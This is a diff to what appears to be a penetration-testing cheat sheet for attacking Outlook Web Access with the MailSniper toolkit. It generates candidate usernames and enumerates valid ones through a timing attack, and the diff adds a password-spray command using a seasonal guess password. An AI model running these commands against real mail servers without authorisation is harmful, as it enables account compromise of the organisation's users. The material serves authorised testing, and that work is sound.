@@ -33,9 +33,14 @@ Invoke-DomainHarvestOWA -ExchHostname <IP>
 /opt/namemash.py names.txt >> possible-usernames.txt
 ```
 
-#### Spray with MailSniper
+#### Timing attack - Get valid usernames
 ```
-Invoke-UsernameHarvestOWA -ExchHostname <IP> -Domain <DOMAIN> -UserList .\possible-usernames.txt -OutFile valid.txt
+Invoke-UsernameHarvestOWA -ExchHostname <IP> -Domain <DOMAIN> -UserList .\possible-usernames.txt -OutFile domain_users.txt
+```
+
+#### Passwors spray
+```
+Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList .\domain_users.txt -Password Summer2021
 ```
 
 # From the inside
